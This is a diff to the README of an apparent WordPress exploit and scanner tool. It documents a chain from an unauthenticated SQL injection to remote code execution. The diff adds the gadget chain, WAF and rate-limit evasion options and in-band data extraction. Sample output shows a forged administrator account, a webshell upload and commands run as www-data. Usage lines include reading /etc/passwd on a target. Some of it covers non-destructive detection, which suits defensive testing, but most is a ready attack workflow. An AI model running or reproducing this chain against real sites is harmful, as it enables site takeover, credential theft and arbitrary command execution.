@@ -59,6 +59,27 @@ context, creating a new administrator account — all from a single unauthentica
 6. RCE                — login → plugin webshell upload → command execution → cleanup.
 ```
 
+### Load-bearing gadgets (why the chain holds)
+
+The novelty is the *composition*, not any single bug — the individual gadgets are legitimate
+WordPress behaviours. Naming them (per Adam Kues's writeup) makes the forged-row graph in `exploit()`
+readable and flags what to re-audit after the entry points were patched:
+
+- **Cache/DB reconciliation** — when an in-memory cached post disagrees with its DB row, WordPress
+  reconciles via `wp_update_post()` and prefers the in-memory `post_type`/`post_status`, letting an
+  `oembed_cache` row be re-typed into a real `post`/`customize_changeset`.
+- **Cycle-detection preserving `post_content`** — the `wp_insert_post_parent` filter walks the parent
+  chain; on a detected cycle it calls a *second* `wp_update_post()` that fixes the parent **without
+  overriding `post_content`**. That is the critical link: it lets the forged changeset's malicious
+  `post_content` survive. (This is why the forged rows use self-/mutual-parent loops.)
+- **Hook replay via `parse_request`** — publishing a post fires `do_action("{$status}_{$type}")`;
+  a forged row with `post_status=parse` / `post_type=request` triggers `parse_request`, re-running the
+  batch pipeline while the changeset's assumed-admin identity (`wp_set_current_user`) still holds.
+
+These gadgets remain present in patched WordPress — only the two *entry points* (batch desync +
+`author__not_in` scalar bypass) were closed. Any new primitive that forges in-memory post cache or
+writes an `oembed_cache` row would re-enable the identical admin-takeover tail.
+
 ### Render-time write primitives
 
 All four render-time write primitives confirmed live against 7.0.1 — each forged as an
@@ -123,26 +144,28 @@ Change the port with `WP_PORT=8100 make up`.
 
 ```
 $ make check
-[VULNERABLE] http://localhost:8093  (WordPress 6.9.4, affected-full-chain)  [active=fired fast=0.02s slow=4.03s delta=4.01s]
+[VULNERABLE] http://localhost:8093  (WordPress 6.9.4, affected-full-chain)  [active=fired | method=boolean rows(true/false)=5/0 via x-wp-total | delivery=json | slot=users]
+        confirmed: unauthenticated SQL injection
+        rce: reachable on stock config; additionally requires no persistent object cache (not verified remotely -- the RCE PoC preflights it before writing)
 
 $ make exploit
-[+] vulnerable (blind SQLi: 0.020s / 4.020s)
 [*] seeding oEmbed caches ...
 [*] extracting table prefix ...
 [+] table prefix: wp_
 [*] extracting admin user ID ...
 [+] admin ID: 1
 [*] recovering oEmbed cache post IDs ...
-[+] cache IDs: [14, 15, 16]
+[+] cache IDs: [5, 6, 7]
 [*] forging changeset + re-entry, creating administrator ...
 [+] administrator created: w2s_...:W2s!...  (w2s_...@wp2shell.local)
 [*] logging in, deploying webshell, executing command ...
+[+] vulnerable (unauth SQLi confirmed: method=boolean slot=users delivery=json)
 [+] RCE output:
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 $ make patched
-[not vulnerable] http://localhost:8093  (WordPress 7.0.2, outside-affected-range)  [fast=0.02s slow=0.03s delta=0.01s]
+[not vulnerable] http://localhost:8093  (WordPress 7.0.2, outside-affected-range)  [active=negative | method=time fast=0.01s slow=0.01s delta=-0.00s | delivery=json | slot=users]
 ```
 
 ---
@@ -153,12 +176,22 @@ Standard library only, no dependencies.
 
 ### Detection (default)
 
-**Non-destructive:** a time-based differential (fast vs. injected `SLEEP`) confirms the injection
-without reading data or changing state. The `SLEEP` is wrapped in a derived table —
-`(SELECT 1 FROM (SELECT SLEEP(n))x)` — so it evaluates once regardless of row count; a bare
-`SLEEP()` is optimized away on some managed hosts and would read as a false negative. `--proof`
-reads only `@@version` and `current_user()` via a bounded blind read. It **does not** extract
-sensitive data or attempt code execution.
+**Non-destructive**, with automatic fallback on three independent axes so a single blocked path
+never reads as a false negative:
+
+- **oracle** — a fast **boolean row-count differential** (flip the injected `WHERE` true/false and
+  watch the confused posts query's `X-WP-Total` collapse, no `SLEEP`) first; if it doesn't fire, a
+  **time-based `SLEEP`** differential. The `SLEEP` is wrapped in a derived table —
+  `(SELECT 1 FROM (SELECT SLEEP(n))x)` — so it evaluates once regardless of row count (a bare
+  `SLEEP()` is optimized away on some managed hosts and would read as a false negative).
+- **delivery** — a **JSON** POST to the batch route first; if an edge blocks `/wp-json`, a
+  **`rest_route=/batch/v1` multipart form on `POST /`** (the exact operator request shape).
+- **slot** — the shifted request is validated against **`/wp/v2/users`** first; if that endpoint is
+  disabled for unauth callers (Disable-REST-API plugins, user-enumeration hardening), it falls back
+  to the universal **`/wp/v2/posts/<id>`** item endpoint.
+
+None of it reads data or changes state. `--proof` reads only `@@version` and `current_user()` via a
+bounded blind read. It **does not** extract sensitive data or attempt code execution.
 
 ```bash
 python3 wp2shell_check.py https://your-site.example --authorized
@@ -168,27 +201,41 @@ python3 wp2shell_check.py http://127.0.0.1:8093 --proxy http://127.0.0.1:8080
 
 ### Pre-auth RCE (`-c COMMAND`)
 
-Full exploitation chain: detect → oEmbed cache seeding → blind SQLi extraction → changeset
-elevation → re-entrant parse_request → admin creation → login → plugin webshell → execute →
-self-cleanup. Works on **stock-default WordPress** — no FILE privilege, no persistent object cache,
-no plugins required.
+Full exploitation chain: detect → **row-forgery preflight** → oEmbed cache seeding →
+**in-band UNION extraction** → changeset elevation → re-entrant parse_request → admin creation →
+login → plugin webshell → execute → self-cleanup. Works on **stock-default WordPress** — no FILE
+privilege, no persistent object cache, no plugins required.
 
 ```bash
 python3 wp2shell_check.py http://127.0.0.1:8093 -c "id"
 python3 wp2shell_check.py https://target.example -c "cat /etc/passwd" --authorized
 ```
 
-The webshell plugin self-destructs after one use (deactivates and deletes its own file).
+- **Preflight before any write.** A single in-band UNION echo confirms the `per_page=-1`
+  split_the_query bypass works on this target *before* the chain writes anything. A persistent
+  object cache (Redis/Memcached — common on managed hosts) forces `split_the_query` and blocks the
+  row forgery: the tool reports that precisely (the SQLi is still present; only the RCE is blocked)
+  and leaves **no** orphan `oembed_cache` rows behind.
+- **In-band extraction.** The table prefix, admin ID and seeded cache IDs are read straight out of
+  the confused posts response (one request each) instead of a per-byte blind `SLEEP` ladder — ~50–
+  100× fewer requests, far less WAF/rate-limit exposure. The blind oracle remains the automatic
+  fallback if an in-band read is ever filtered.
+- The webshell plugin self-destructs after one use (deactivates and deletes its own file).
 
 ### Options
 
 `-c CMD` (pre-auth RCE), `--proof` (read-only evidence), `-f FILE` (batch scan),
-`-t/--threads N` (concurrent workers, default 10), `--sleep N` (injected delay, default 4),
-`--rounds N` (median over N probes), `--route auto|rest-route|wp-json`,
-`--timeout N`, `--proxy URL`, `--json`, `--authorized`.
+`-t/--threads N` (concurrent workers, default 10), `--method auto|boolean|time`,
+`--delivery auto|json|multipart` (`--multipart` alias), `--slot auto|users|posts-item`,
+`--sleep N` (injected delay, default 4), `--rounds N` (median over N probes),
+`--route auto|rest-route|wp-json`, `--timeout N`, `--proxy URL`, `--json`, `--authorized`.
 
 **Status values**
-- `vulnerable` — actively confirmed via the injection (batch confusion, 6.9.0–7.0.1).
+- `vulnerable` — actively confirmed via the injection (batch confusion, 6.9.0–7.0.1). What the
+  active oracle proves is the **unauthenticated SQL injection**; the pre-auth RCE is reachable from
+  it on a stock install but additionally requires **no persistent object cache** (a precondition
+  not verifiable remotely — the RCE PoC preflights it before writing). Output makes that split
+  explicit (`confirmed:` / `rce:` lines).
 - `affected_version` — fingerprinted version is in an affected range but the active check didn't
   fire (6.8.0–6.8.5 has the SQLi sink but not the confusion; or a WAF blocked the probe).
 - `not_vulnerable` — active check negative and version outside the affected ranges.
